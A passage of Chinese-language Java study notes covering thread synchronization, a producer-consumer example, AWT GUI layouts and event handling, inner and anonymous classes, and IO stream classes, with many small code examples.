           break;   \n            }                \n        }\n    }\n}\npublic class TestTickets_2\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        Thread t1 = new Thread(aa);\n        t1.start();\n        \n        Thread t2 = new Thread(aa);\n        t2.start();\n    }\n}\n```\n\n```java\nclass A extends Thread\n{\n    private static int tickets = 100;//确保aa1和aa2共有100张票\n    private static String str = new String(\"v5le0n9\");\n    public void run()\n    {\n     \twhile(true)\n     \t{\n            synchronized(str)\n            {//不能用this，因为不同对象this不同，也就不能实现同步，所以要在A类固定一个静态的str\n                if(tickets > 0)\n                {\n                    System.out.printf(\"%s线程正在卖出第%d张票\\n\", Thread.currentThread().getName(), tickets);\n                    tickets--;\n                }\n                else\n                    break;   \n            }                \n        }\n    }\n}\npublic class TestTickets_3\n{\n    public static void main(String[] args)\n    {\n        A aa1 = new A();\n        aa1.start();\n        A aa2 = new A();\n        aa2.start();\n    }\n}\n```\n\n```java\nclass A extends Thread\n{\n    private static int tickets = 100;\n    private static String str = new String(\"v5le0n9\");\n    \n    //public synchronized void run()//错误，只有一个站点卖票\n    public void run()\n    {\n        //String str = new String(\"v5le0n9\");//错误，两个站点没有共用局部变量\n        //String str = \"v5le0n9\";//正确，两个str指向同一个数据段地址\n     \twhile(true)\n     \t{\n            synchronized(str)\n            {\n                if(tickets > 0)\n                {\n                    System.out.printf(\"%s线程正在卖出第%d张票\\n\", Thread.currentThread().getName(), tickets);\n                    tickets--;\n                }\n                else\n                    break;   \n            }                \n        }\n    }\n}\npublic class TestTickets_4\n{\n    public static void main(String[] args)\n    {\n        A aa1 = new A();\n        aa1.start();\n        A aa2 = new A();\n        aa2.start();\n    }\n}\n```\n\n## 生产消费\n\n```java\nclass Stack\n{\n    int index = 0;\n    char[] data = new char[6];\n    public void push(char c)\n    {\n        data[index] = c;\n        index++;\n    }\n    public char pop()\n    {\n        index--;\n        return data[index];\n    }\n}\n```\n\n压栈出栈如果不同步会出错。当push执行的时候不能执行pop，反之同理。\n\n```java\nclass SynStack\n{\n    private char[] data = new char[6];\n    private int cnt = 0;//表示数组有效元素的个数\n    public synchronized void push(char ch)\n    {\n        while(cnt == data.length)\n        {\n            try\n            {\n                this.wait();//暂停\n            }\n            catch(Exception e)\n            {}\n        }\n        this.notify();//唤醒\n        data[cnt] = ch;\n        ++cnt;\n        System.out.printf(\"生产线程正在生产第%d个产品，该产品是：%c\\n\", cnt, ch);\n    }\n    public synchronized char pop()\n    {\n        char ch;\n        while(cnt == 0)\n        {\n            try\n            {\n                this.wait();//暂停当前线程\n            }\n            catch(Exception e)\n            {}\n        }\n        this.notify();//唤醒其它wait线程\n        ch = data[cnt-1];\n        System.out.printf(\"---消费线程正在消费第%d个产品，该产品是：%c\\n\", cnt, ch);\n        --cnt;\n        return ch;\n    }\n}\nclass Producer implements Runnable\n{\n    private SynStack ss = null;\n    public Producer(SynStack ss)\n    {\n        this.ss = ss;\n    }\n    public void run()\n    {\n        //push('a');//错误，不能用别的类的方法\n        char ch;\n       \tfor(int i=0; i<20; i++)\n        {\n            ch = (char)('a' + i);\n            ss.push(ch);\n        }\n    }\n}\nclass Consumer implements Runnable\n{\n    private SynStack ss = null;\n    public Consumer(SynStack ss)\n    {\n        this.ss = ss;\n    }\n    public void run()\n    {\n        for(int i=0; i<20; i++)\n        {\n            try\n            {\n                Thread.sleep(200);\n            }\n            catch(Exception e)\n            {}\n            ss.pop();\n        }        \t\n    }\n}\npublic class TestPC\n{\n    public static void main(String[] args)\n    {\n        SynStack ss = new SynStack();\n        Producer p = new Producer(ss);\n        Consumer c = new Consumer(ss);\n        Thread t1 = new Thread(p);\n        t1.start();\n        Thread t2 = new Thread(c);\n        t2.start();\n    }\n}\n```\n\n# awt展望\n\n```java\nimport java.awt.*;\npublic class TestCom\n{//显示绿色窗口\n    public static void main(String[] args)\n    {\n        Frame f = new Frame();\n        f.setSize(400, 400);\n        f.setBackground(Color.GREEN);\n        f.setVisible(true);\n    }\n}\n```\n\n# GUI(图形化用户界面)\n\n## 组件\n\n组件是图形用户界面的基本组成元素，凡是能够以图形化方式显示在屏幕上并能够与用户进行交互的对象均为组件，如菜单、按钮、标签、文本框、滚动条等。\n\n组件分类\n\n- java.awt.Component\n- java.awt.MenuComponent\n\n抽象类java.awt.Component是除菜单相关组件之外所有Java AWT组件类的根父类，该类规定了GUI组件的基本特性，如尺寸、位置和颜色效果等，并实现了作为一个GUI部件所应具备的基本功能。\n\n## 容器\n\n组件通常不能独立地显示出来，必须将组件放在一定的容器中才可以显示出来。\n\n有一类特殊的组件是专门用来包含其他组件的，这类组件叫容器，java.awt.Container是所有容器的父类，java.awt.Container继承自java.awt.Component\n\n容器类对象本身也是一个组件，具有组件的所有性质，但组件不一定是容器。\n\n## Frame常用方法\n\n| 常用方法                                                   | 功能                                                         |\n| ---------------------------------------------------------- | ------------------------------------------------------------ |\n| public void setBounds(int x, int y, int width, int height) | 设置窗体的位置和大小，x和y表示窗体左上角距离屏幕水平和垂直距离，width和height是窗体自身的宽度和高度 |\n| public void setSize(int width, int heigth)                 | 设置窗体的大小，width和height是窗体自身的宽度和高度          |\n| public void setVisible(boolean flag)                       | 设置窗体是否可见，true表示可见。false表示不可见              |\n| public void setBackground(Color c)                         | 设置窗体的背景色                                             |\n\n```java\nimport java.awt.*;\npublic class TestFrame\n{\n    public static void main(String[] args)\n    {\n        Frame f = new Frame(\"v5le0n9\");//标题\n        //Button bn = new Button(\"张三\");//按钮中显示张三\n        //f.add(bn);\n        f.setSize(200, 200);\n        f.setLocation(300, 300);//距离屏幕(x,y)\n        //f.setBounds(300,300,200,200)//相当于上面两个\n        f.setBackground(Color.RED);\n        f.setVisible(true);\n    }\n}\n```\n\n```java\nimport java.awt.Frame;\npublic class TestFrame_2\n{\n    public static void main(String[] args)\n    {\n        Frame f = new Frame(\"v5le0n9\");\n        f.setize(200,200);\n        f.setVisible(true);\n        try\n        {\n            Thread.sleep(2000);\n        }\n        catch(InterruptedException e)\n        {\n            System.out.println(e.getMessage());\n        }\n        f.setLocation(200, 200);\n        try\n        {\n            Thread.sleep(2000);\n        }\n        catch(InterruptedException e)\n        {\n            System.out.println(e.getMessage());\n        }\n        f.setVisible(false);\n    }\n}\n```\n\n```java\nimport java.awt.*;\npublic class TestFrame_3\n{\n    public static void main(String[] args)\n    {\n        MyFrame f1 = MyFrame(100,100,200,200,Color.BLUE);\n        MyFrame f2 = MyFrame(300,100,200,200,Color.YELLOW);\n        MyFrame f3 = MyFrame(100,300,200,200,Color.GREEN);\n        MyFrame f4 = MyFrame(300,300,200,200,Color.MAGENTA);\n    }\n}\nclass MyFrame extends Frame\n{\n    public static int id = 0;\n    MyFrame(int x, int y, int w, int h, Color color)\n    {\n        super(\"MyFrame \" + (id++));\n        setBackground(color);\n        setLayout(null);\n        setBounds(x, y, w, h);\n        setVisible(true);\n    }\n}\n```\n\n## Panel\n\npanel是容纳其他组件的组件，即容器。panel不能单独存在，必须被添加到其他容器中。\n\n```java\nimport java.awt.*;\npublic class TestPanel\n{\n    public static void main(String[] args)\n    {\n        Frame f = new Frame(\"Java Frame with Panel\");\n        Panel p = new Panel();\n        f.setLayout(null);\n        f.setBounds(300,300,500,500);\n        f.setBackground(new Color(100,100,102));\n        p.setBounds(300/2,300/2,500/2,500/2);//相对于父窗口而言\n        p.setBackground(new Color(204,204,255));\n        f.add(p);//p容器要放到f容器中\n        f.setVisible(true);\n    }\n}\n```\n\n## 布局管理器\n\n容器对其中所包含组件的排列方式，包括组件的位置和大小设定，被称为容器的布局(Layout)。\n\n为了使图形用户界面具有良好的平台无关性，Java语言提供了布局管理器来管理容器的布局，而不建议直接设置组件在容器中的位置和尺寸。\n\n每个容器都有一个默认的布局管理器，当容器需要对某个组件进行定位或判断大小尺寸时，就会自动调用其对应的布局管理器。\n\n在AWT中，常见的布局管理器有：\n\n- BorderLayout\n- FlowLayout\n- GridLayout\n\n```java\nimport java.awt.*;\npublic class TestFlowLayout\n{\n    public static void main(String[] args)\n    {\n        Frame f = new Frame(\"Flow Layout\");\n        Button button1 = new Button(\"OK\");\n        Button button2 = new Button(\"Open\");\n        Button button3 = new Button(\"Close\");\n        f.setLayout(new FlowLayout(FlowLayout.CENTER));\n        f.add(button1);\n        f.add(button2);\n        f.add(button3);\n        f.setSize(300,400);\n        f.setVisible(true);\n    }\n}\n```\n\n```java\nimport java.awt.*;\npublic class TestFlowLayout_2\n{\n    public static void main(String[] args)\n    {\n        Frame f = new Frame(\"Java Frame\");\n        FlowLayout l = new FlowLayout(FlowLayout.CENTER, 30, 30);\n        f.setLayout(l);\n        f.setLocation(300,400);\n        f.setSize(300,100);\n        f.setBackgrond(new Color(255,255,255));\n        for(int i=0; i<7; i++)\n        {\n            f.add(new Button(\".BUTTON\"));\n        }\n        f.setVisible(true);\n    }\n}\n```\n\n### BorderLayout\n\nBorderLayout是Frame类的默认布局管理器，将整个容器布局划分成东(EAST)、西(WEST)、南(SOUTH)、北(NORTH)、中(CENTER)。如不指定组件的加入部位，则默认加入到CENTER区。每个区域只能加入一个组件，如果加入多个，则先前加入的会被覆盖。\n\n```java\nimport java.awt.*;\npublic class TestBorderLayout\n{\n    public static void main(String[] args)\n    {\n        Frame f;\n        f = new Frame(\"Border Layout\");\n        Button bn = new Button(\"BN\");\n        Button bs = new Button(\"BS\");\n        Button bw = new Button(\"BW\");\n        Button be = new Button(\"BE\");\n        Button bc = new Button(\"BC\");\n        //f.add(bn, \"North\");//把bn放在北\n        //f.add(bs, \"South\");\n        //f.add(bw, \"West\");\n        //f.add(be, \"East\");\n        //f.add(bc, \"Center\");\n        \n        //更准确的写法\n        f.add(bn, BoderLayout.NORTH);\n        f.add(bs, BoderLayout.SOUTH);\n        f.add(bw, BoderLayout.WEST);\n        f.add(be, BoderLayout.EAST);\n        f.add(bc, BoderLayout.CENTER);\n        \n        f.setSize(200,200);\n        f.setVisible(true);\n    }\n}\n```\n\n### GridLayout\n\nGridLayout型布局管理器将空间划分成规则的矩形网格，每个单元格区域大小相等。组件被添加到每个单元格中，先从左到右添满一行后换行，再从上到下。\n\n在GridLayout构造方法中指定分割的行数和列数，如GridLayout(3,4)。\n\n```java\nimport java.awt.*;\npublic class TestGridLayout\n{\n    public static void main(String[] args)\n    {\n        Frame f = new Frame(\"GridLayout Example\");\n        Button b1 = nee Button(\"b1\");\n        Button b2 = nee Button(\"b2\");\n        Button b3 = nee Button(\"b3\");\n        Button b4 = nee Button(\"b4\");\n        Button b5 = nee Button(\"b5\");\n        f.setLayout(new GridLayout(2,10));//行一定会显示2行，但列数根据行数调整\n        f.add(b1);\n        f.add(b2);\n        f.add(b3);\n        f.add(b4);\n        f.add(b5);\n        f.pack();//如果没有这语句，只显示一个有标题的小窗口\n        f.setVisible(true);\n    }\n}\n```\n\n### 十个按钮的设计\n\n```java\nimport java.awt.*;\npublic class TestGUI\n{\n    public static void main(String[] args)\n    {\n        Frame f = new Frame();\n        f.setSize(400,400);\n        f.setLayout(new GridLayout(2,1));\n        \n        Panel p1 = new Panel();\n        p1.setLayout(new BorderLayout());\n        Panel p1_1 = new Panel();\n        p1_1.setLayout(new GridLayout(2,1));\n        \n        Button bn1 = new Button(\"Button1\");\n        Button bn2 = new Button(\"Button2\");\n        Button bn3 = new Button(\"Button3\");\n        Button bn4 = new Button(\"Button4\");\n        \n        p1.add(bn1, BorderLayout.WEST);\n        p1_1.add(bn3);\n        p1_1.add(bn4);\n        p1.add(p1_1, BorderLayout.CENTER);\n        p1.add(bn2, BorderLayout.EAST);\n        \n        Panel p2 = new Panel();\n        p2.setLayout(new BorderLayout());\n        Panel p2_2 = new Panel();\n        p2_2.setLayout(new GridLayout(2,2));\n        Button bn5 = new Button(\"Button5\");\n        Button bn6 = new Button(\"Button6\");\n        Button bn7 = new Button(\"Button7\");\n        Button bn8 = new Button(\"Button8\");\n        Button bn9 = new Button(\"Button9\");\n        Button bn10 = new Button(\"Button10\");\n        p2.add(bn5, BorderLayout.WEST);\n        p2.add(bn6, BorderLayout.EAST);\n        p2_2.add(bn7);\n        p2_2.add(bn8);\n        p2_2.add(bn9);\n        p2_2.add(bn10);\n        p2.add(p2_2);\n        \n        f.add(p1);\n        f.add(p2);\n        f.pack();\n        f.setVisible(true);\n    }\n}\n```\n\n\n\n## 事件处理\n\n```java\nimport java.awt.*;\nimport java.awt.event.*;\npublic class TestButton\n{\n    public static void main(String[] args)\n    {\n        Frame f = new Frame();\n        Button bn = mew Button(\"OK\");//事件源\n        f.add(bn);\n        A aa = new A();//事件监听器\n        bn.addActionListener(aa);//鼠标单击OK在黑窗口显示hello world!\n        f.pack();\n        f.addWindowListerner(new B());//点程序的×就可以关闭程序\n        f.setVisible(true);\n    }\n}\nclass B extends WindowAdapter //implements WindowListener//这个里面有很多抽象类，所以必须要重写所有的抽象类才能是普通类，否则B需定义为抽象类。而WindowAdapter只需重写需要的\n{\n    public void windowClosing(WindowEvent e)\n    {\n        System.exit(-1);\n    }\n}\nclass A implements ActionListener\n{\n    public void actionPerformed(ActionEvent e)\n    {//方法重写\n        System.out.println(\"hello world!\");\n        //System.exit(-1);//退出程序\n    }\n}\n```\n\n默认情况下事件源不会自动产生任何事件，程序员需要做两件事：\n\n1. 告诉事件源可以自动产生哪类事件，即向事件源注册某种事件的事件监听器对象\n2. 设计好可以处理这种事件的事件监听器\n\n一旦完成这两步操作，当用户对事件源进行操作时。事件源就会自动产生事件，事件源就会自动把产生的事件封装成一个事件对象，事件源就会自动把封装好的事件对象传递给事件监听器。\n\n事件监听器收到事件源发送过来的事件时，事件监听器就会自动调用相应的事件处理方法来对该事件进行相应的处理。\n\n### 事件种类\n\njava.awt.event包中含有所有的事件，常用的事件有：\n\n- ActionEvent：激活组件时发生的事件\n- KeyEvent：操作键盘时发生\n- MouseEvent：操作鼠标时发生\n- WindowEvent：操作窗口时发生的事件，如最大化或最小化某一窗口\n\n一个事件源会产生哪些事件，一般第三方软件会自动显示，不需要特地记忆。\n\n## 三个文本框相加运算\n\n```java\nimport java.awt.*;\nimport java.awt.event.*;\npublic class TestTextField\n{\n    public static TextField tf1, tf2, tf3;//MyMonitor类需要调用这几个属性，所以不能写在main里\n    public static void main(String[] args)\n    {\n        tf1 = new TextField(30);\n        tf2 = new TextField(30);\n        tf3 = new TextField(30);\n        Button bn = new Button(\"=\");\n        Label lb = new Label(\"+\");\n        Frame f = new Frame(\"文本框相加示例\");\n        f.setLayout(new FlowLayout());\n        f.add(tf1);\n        f.add(lb);\n        f.add(tf2);\n        f.add(bn);\n        f.add(tf3);\n        bn.addActionListener(new MyMonitor());\n        f.pack();\n        f.setVisible(true);\n    }\n}\nclass MyMonitor implements ActionListener\n{\n    @Override//用法看下个例子\n    public void actionPerformed(ActionEvent e)\n    {\n        String str1 = TestTextField.tf1.getText();\n        String str2 = TestTextField.tf2.getText();\n        int num1 = Integer.parseInt(str1);\n        int num2 = Integer.parseInt(str2);\n        int num3 = num1 + num2;\n        \n        //第一种方法\n        Integer it = new Integer(num3);\n        String str3 = it.toString();\n        TestTextField.tf3.setText(str3);\n        \n        //第二种方法\n        String str3 = num3 + \"\";\n        TestTextField.tf3.setText(str3);\n        \n        //第三种方法\n        String str3 = Integer.toString(num3);//整型以字符串输出\n        TestTextField.tf3.setText(str3);\n        \n        //第四种方法\n        String str3 = String.ValueOf(num3);\n        TestTextField.tf3.setText(str3);\n    }\n}\n```\n\n```java\nclass A\n{\n\tpublic void dsvdknslsvjfnhvfbcj()\n    {\n        System.out.println(\"AAAA\");\n    }\n}\nclass B extends A\n{\n    @Override//这个提示下面的方法是重写父类的方法，如果不是重写父类的方法则会提示有错\n    public void dsvdknslsvjfnhvfbcj()\n    {\n        System.out.println(\"BBBB\");\n    }\n}\npublic class TestOverride\n{\n    public static void main(String[] args)\n    {\n        A aa = new B();//父类创建一个子类对象\n        aa.dsvdknslsvjfnhvfbcj();//输出BBBB\n    }\n}\n```\n\n```java\nimport java.awt.*;\nimport java.awt.event.*;\npublic class TestTextField_2\n{//改良版\n    public static void main(String[] args)\n    {\n        new TF().launch();\n    }\n}\nclass TF\n{\n    public TextField tf1, tf2, tf3;\n    public void launch()\n    {\n        tf1 = new TextField(30);\n        tf2 = new TextField(30);\n        tf3 = new TextField(30);\n        Button bn = new Button(\"=\");\n        Label lb = new Label(\"+\");\n        Frame f = new Frame(\"文本框相加示例\");\n        f.setLayout(new FlowLayout());\n        f.add(tf1);\n        f.add(lb);\n        f.add(tf2);\n        f.add(bn);\n        f.add(tf3);\n        bn.addActionListener(new MyMonitor(this));\n        f.pack();\n        f.setVisible(true);\n    }\n}\nclass MyMonitor implements ActionListener\n{\n    private TF tf;\n    public MyMonitor(TF tf)\n    {\n        this.tf = tf;\n    }\n    @Override\n    public void actionPerformed(ActionEvent e)\n    {\n        String str1 = tf.tf1.getText();\n        String str2 = tf.tf2.getText();\n        int num1 = Integer.parseInt(str1);\n        int num2 = Integer.parseInt(str2);\n        int num3 = num1 + num2;\n\n        String str3 = num3 + \"\";\n        tf.tf3.setText(str3);\n    }\n}\n```\n\n```java\nimport java.awt.*;\nimport java.awt.event.*;\npublic class TestTextField_3\n{//再次改良版内部类\n    public static void main(String[] args)\n    {\n        new TF().launch();\n    }\n}\nclass TF\n{\n    private TextField tf1, tf2, tf3;\n    public void launch()\n    {\n        tf1 = new TextField(30);\n        tf2 = new TextField(30);\n        tf3 = new TextField(30);\n        Button bn = new Button(\"=\");\n        Label lb = new Label(\"+\");\n        Frame f = new Frame(\"文本框相加示例\");\n        f.setLayout(new FlowLayout());\n        f.add(tf1);\n        f.add(lb);\n        f.add(tf2);\n        f.add(bn);\n        f.add(tf3);\n        bn.addActionListener(new MyMonitor());\n        f.pack();\n        f.setVisible(true);\n    }\n    \n    class MyMonitor implements ActionListener\n    {\n        @Override\n        public void actionPerformed(ActionEvent e)\n        {\n            String str1 = tf1.getText();\n            String str2 = tf2.getText();\n            int num1 = Integer.parseInt(str1);\n            int num2 = Integer.parseInt(str2);\n            int num3 = num1 + num2;\n            String str3 = num3 + \"\";\n            tf3.setText(str3);\n        }\n    }\n}\n```\n\n### 内部类\n\n内部类定义：在A类的内部但是所有方法的外部定义了一个B类，则B类就是A类的内部类，A是B的外部类。\n\n内部类的方法可以访问外部类所有成员，外部类的方法不可以直接访问内部类的成员。\n\n内部类的优点：①可以让一个类方便地访问另一类中的所有成员；②增加程序的安全性，有效避免其他部相关类对该类的访问。\n\n### 匿名类\n\n匿名类是一种特殊的内部类。如果在一个方法内部定义了一个匿名类，则该匿名类可以访问：①外部类的所有成员；②包裹该匿名类的方法中的所有final类型的局部变量，非final类型的局部变量无法被匿名类访问。\n\n创建匿名类的三种方式：继承父类、实现接口、实现抽象类。\n\n#### 创建匿名类之实现接口\n\n假设A是接口名，格式：\n\n```java\nnew A()\n{\n    //实现接口中方法的代码\n};\n```\n\n生成一个实现了A接口的匿名类对象。\n\n#### 创建匿名类之实现抽象类\n\n假设A是抽象类，格式：\n\n```java\nnew A()\n{\n    //实现了A类的所有抽象类的方法代码\n    //添加自己的方法或属性代码(不建议，没有实际意义)\n}\n```\n\n生成一个匿名类，该匿名类必须得实现了A类的所有抽象方法，当然该匿名类也可以定义自己的属性和方法。\n\n#### 创建匿名类之继承父类\n\n假设A是个类名，格式：\n\n```java\nnew A()\n{\n    //重写了A类的方法代码\n    //添加自己的属性和方法(不建议，没有实际意义)\n}\n```\n\n生成一个A类的子类对象，该匿名类对象继承了A的所有非private成员。\n\n```java\nimport java.awt.*;\nimport java.awt.event.*;\npublic class TestWindow\n{\n    public static void main(String[] args)\n    {\n        Frame f = new Frame();\n        f.setSize(300,300);\n        f.addWindowListener(\n        \tnew WindowAdapter()\n            {//匿名类\n                @Override\n                public void windowClosing(WindiwEvent e)\n                {\n                    //f.setVisible(false);//错误，如果final Frame f = new Frame();才对\n                    System.exit(-1);\n                }\n            }\n        );\n        f.setVisible(true);\n    }\n}\n```\n\n## 可运行jar包生成步骤\n\n1. 新建一个记事本文件，假设为1.txt，文件内容：\n\n- Main-Class: 可运行类的名字(启动类的名字)\n- 附注：记得敲回车\n\n2. dos下命令：\n\n- ```\n  jar cvfm haha.jar 1.txt *.class\n  ```\n\n注意：只有GUI程序生成的class文件才可以作为main class\n\n# 流\n\n```java\nimport java.io.*;\npublic class TestFileReader\n{\n    public static void main(String[] args) throws Exception\n    {\n        FileReader fr = new FileReader(\"D:\\\\Java\\\\TestFileReader.java\");//某个文件路径\n        int ch;\n        int cnt = 0;\n        ch = fr.read();//从文件读取字符编码，用整型变量存储\n        while(-1 != ch)\n        {\n            ++cnt;\n            System.out.printf(\"%c\",(char)ch);\n            ch = fr.read();\n        }\n        System.out.printf(\"该文件字符的个数是%d\\n\", cnt);\n        fr.close();\n    }\n}\n```\n\n```java\nimport java.io.*;\npublic class TestFileInputStream\n{\n    public static void main(String[] args) throws Exception\n    {\n        FileInputStream fis = new FileInputStream(\"D:\\\\Java\\\\TestFileReader.java\");\n        int ch;\n        int cnt = 0;\n        ch = fis.read();\n        while(-1 != ch)\n        {\n            ++cnt;\n            System.out.printf(\"%c\",(char)ch);\n            ch = fis.read();\n        }\n        System.out.printf(\"该文件字节的个数是%d\\n\", cnt);//汉字显示乱码，因为汉字占两个字节\n        fis.close();\n    }\n}\n```\n\n流就是程序和设备之间嫁接起来的一根用于数据传输的管道，这个管道上有很多按钮，不同的按钮可以实现不同的功能。这根带按钮的用于数据传输的管道就是流。\n\n## 流的分类\n\njava.io包中定义了多个流类型(类或抽象类)来实现输入/输出功能，可以从不同的角度对其进行分类：\n\n- 按数据流的方向不同可以分为输入流和输出流\n- 按处理数据单位不同可以分为多字节流和字符流\n- 按照功能不同可以分为节点流和处理流\n\nJ2SDK所提供的所有流类型位于包java.io内部分别继承自以下四种抽象流类型：\n\n|        | 字节流       | 字符流 |\n| ------ | ------------ | ------ |\n| 输入流 | InputStream  | Reader |\n| 输出流 | OutputStream | Writer |\n\n## 四大基本流\n\n### InputStream\n\n```java\npublic int read() throws IOException\n```\n\n读取一个字节并以整数形式返回，如果读取到输入流的末尾则返回-1。\n\n```java\npublic int read(byte[] b) throws IOException\n```\n\n从输入流中读取一定数量的字节，并将其存储在缓冲区数组b中。以整数形式返回实际读取的字节数。\n\n如果b的长度为0，则不读取任何字节并返回0；如果因为流位于文件末尾而没有可用的字节，则返回值为-1。\n\n```java\n//例子\nbyte[] buf = new byte[1000];\nFileInputStream fis = new FileInputStream(\"D:\\\\Java\\\\errorlog.txt\");\nint len = fis.read(buf);//读取出来的数据存到buf数组,返回数据长度len\n```\n\n```java\npublic int read(byte[] b, int off, int len) throws IOException\n```\n\n从输入流中最多读取len个字节的数据并存入byte数组中，b表示读取的数据要存入的数组的名字，off表示第一个读出的数据要存入的位置，即下标，len表示最多能读取的字节数。\n\n```java\nvoid close() throws IOException\n```\n\n关闭此输入流并释放与该流关联的所有系统资源。\n\n```java\nlong skip(long n) throws IOException\n```\n\n跳过和丢弃此输入流中数据的n个字节。\n\n### OutPutStream\n\n```java\n//向输出流中写入一个字节数据，该字节数据为参数b的低8位\nvoid write(int b) throws IOException\n    \n//将一个字节类型的数组中的数据写入输出流\nvoid write(byte[] b) throws IOException\n    \n//将一个字节类型的数组中的从指定位置(off)开始的len个字节写入到输出流\nvoid write(byte[] b, int off, int len) throws IOException\n    \n//关闭流释放内存资源\nvoid close() throws IOException\n    \n//将输出流中缓冲的数据全部写出到目的地\nvoid flush() throws IOException\n```\n\n### Reader\n\n```java\n//读取一个字符并以整数形式返回\nint read() throws IOException\n    \n//读取一系列字符并存储到一个数组cbuf\nint read(char[] cbuf) throws IOException\n    \n//从offset位置开始，最多读取length个字符，并存储到数组cbuf\nint read(char[] cbuf, int offset, int length) throws IOException\n    \n//关闭流释放内存资源\nvoid close() throws IOException\n    \n//跳过n个字符不读，返回实际跳过的字节数\nlong skip(long n) throws IOException\n```\n\n### Writer\n\n```java\n//向输出流中写入一个字符数据，该字符数据为参数c的低16位\nvoid write(int c) throws IOException\n    \n//将一个字符类型的数组中的数据写入输出流\nvoid write(char[] cbuf) throws IOException\n    \n//将一个字符类型的数组中的从指定位置(off)开始的len个字符写入到输出流\nvoid write(char[] cbuf, int off, int len) throws IOException\n    \n//将一个字符串中的字符写入到输出流\nvoid write(String string) throws IOException\n    \n//将一个字符串从指定位置(off)开始的len个字符写入到输出流\nvoid write(String string, int off, int len) throws IOException\n\n//关闭流释放内存资源\nvoid close() throws IOException\n    \n//将输出流中缓冲的数据全部写出到目的地\nvoid flush() throws IOException\n```\n\n## 字节流和字符流的区别\n\n```java\nimport java.io.*;\npublic class TestFileReaderWriterCopy\n{//字符流，复制文本文件可以，但视频音频照片等字节数据复制会出错\n    public static void main(String[] args) throws Exception\n    {\n        FileReader fr = new FileReader(\"D:\\\\Java\\\\TestFileReaderWriterCopy.java\");\n        FileWriter fw = new FileWriter(\"D:\\\\v5le0n9.txt\");\n        int ch;\n        ch = fr.read();\n        while(-1 != ch)\n        {\n            fw.write(ch);\n            ch = fr.read();\n        }\n        fw.flush();//刷新\n        fr.close();\n        fw.close();\n    }\n}\n```\n\n```java\nimport java.io.*;\npublic class TestFileInputStreamOutputStreamCopy\n{//字节流，可复制文本文件和非文本文件\n    public static void main(String[] args) throws Exception\n    {\n        FileInputStream fis = new FileInputStream(\"D:\\\\Java\\\\TestFileReaderWriterCopy.java\");\n        FileOutputStream fos = new FileOutputStream(\"D:/v5le0n9.txt\");\n        int ch;\n        ch = fis.read();\n        while(-1 != ch)\n        {\n            fos.write(ch);\n            ch = fis.read();\n        }\n        fos.flush();//刷新\n        fis.close();\n        fos.close();\n    }\n}\n```\n\n例：\n\n```java\nAF ED CB FF 12 CE\n//字节流一个一个字节读(AF)\n//字符流两个字节读(AF ED)，把二进制数据转换为字符，返回整型，存在解码和编码的问题\n```\n\n## 缓冲流\n\n缓冲流就是带有缓冲区的输入输出流。缓冲流可以显著地减少对IO的访问次数，保护硬盘。\n\n缓冲流是处理流，必须依附于节点流。\n\nJ2SDK提供了四种缓冲流，其常用的构造方法为：\n\n```java\nBufferedReader(Reader in)\nBufferedReader(Reader in, int sz)//sz为自定义缓冲区大小\n\nBufferedWriter(Writer out)\nBufferedWriter(Wreiter out, int sz)\n\nBufferedInputStream(InputStream in)\nBufferedInputStream(InputStream in, int size)\n\nBufferedOutputStream(OutputStream out)\nBufferedOutputStream(OutputStream out, int size)\n```\n\n缓冲输入流支持其父类的mark和reset方法。\n\nBufferedReader提供了readLine方法用于读取一行字符串(以\\r或\\n分隔)。\n\nBufferedWriter提供了newLine用于写入一个行分隔符。\n\n对于输出的缓冲流，写出的数据会现在内存中缓存，使用flush方法将会是内存中的数据立刻写出。\n\n```java\nimport java.io.*;\npublic class TestBufferedInputStreamOutputStreamCopy\n{\n    public static void main(String[] args) throws Exception\n    {\n        BufferedInputStream bis = new BufferedInputStream(new FileInputStream(\"D:\\\\Java\\\\TestFileReaderWriterCopy.java\"));\n        BufferedOutputStream bos = new BufferedOutpuntStream(new FileOutputStream(\"D:/v5le0n9.txt\"));\n        byte[] buf = new byte[1024];//每次缓存1024个字节\n        int len;\n        len = bis.read(buf);\n        while(-1 != len)\n        {\n            //bos.write(buf);//很可能错误，因为最后可能没有1024个字节\n            bos.write(buf, 0, len);\n            len = bis.read(buf);\n        }\n        bos.flush();\n        bis.close();\n        bos.close();\n    }\n}\n```\n\n```java\nimport java.io.*;\npublic class TestBufferedReaderWriterCopy\n{\n    public static void main(String[] args)\n    {\n        BufferedReader br = null;\n        BufferedWriter bw = null;\n        try\n        {\n            br = new BufferedReader(new FileReader(\"D:/Java/TestBufferedReaderWriterCopy.java\"));\n            bw = new BufferedWriter(new FileWriter(\"D:\\\\Java\\\\v5le0n9.heihei\"));\n            String str = null;\n            while(null != (str=br.readLine()))//一行行读\n            {\n                bw.write(str);\n                bw.newLine();//写入一个换行符，这行不能省\n            }\n            bw.flush();\n        }\n        catch(FileNotFoundException e)\n        {\n            e.printStackTrace();\n            Sytsem.exit(-1);\n        }\n        catch(IOException e)\n        {\n            e.printStackTrace();\n            Sytsem.exit(-1);\n        }\n        finally\n        {\n            try\n            {\n                bw.close();\n                br.close();\n            }\n            catch(IOException e)\n            {\n                e.printStackTrace();\n                Sytsem.exit(-1);\n            }\n        }\n    }\n}\n```\n\n## 数据流\n\n### DataInputStream\n\nDataInputStream能够以一种有与机器无关的方式，直接从底层字节输入流读取Java基本类型和String类型的数据，常用的方法包括：\n\n```java\npublic DataInputStream(InputStream in)\npublic final boolean readBoolean()\npublic final byte readByte()\npublic final char readChar()\npublic final double readDouble()\npublic final float readFloat()\npublic final int readInt()\npublic final long readLong()\npublic final short readShort()\npublic final String readUTF()\n```\n\nDataInputStream是包裹流(处理流)，必须依附于InputStream\n\n### DataOutputStream\n\nDataOutputStream能够以一种与机器无关的方式，直接将Java基本类型和String类型数据写出到其他的字节输出流。常见方法：\n\n```java\npublic DataOutputStream(OutputStream out)\npublic final boolean writeBoolean()\npublic final byte writeByte()\npublic final char writeChar()\npublic final double writeDouble()\npublic final float writeFloat()\npublic final int writeInt()\npublic final long writeLong()\npublic final short writeShort()\npublic final String writeUTF()\n```\n\nDataOutputStream是包裹流(处理流)，必须依附于OutputStream\n\n### 数据流实例\n\n编程实现将long类型数据写入byte数组，然后再从byte数组中把该数据读出来。\n\n```java\nimport java.io.*;\npublic class TestByteArrayOutputStream\n{\n    public static void main(String[] args) throws Exception\n    {\n        long n = 9876543210L;\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();//字节数组输出流，字节数组输出流自动生成一个字节数组\n        DataOutputStream dos = new DataOutputStream(baos);\n        dos.writeLong(n);//把长整型写入字节数组里面去\n        dos.flush();\n        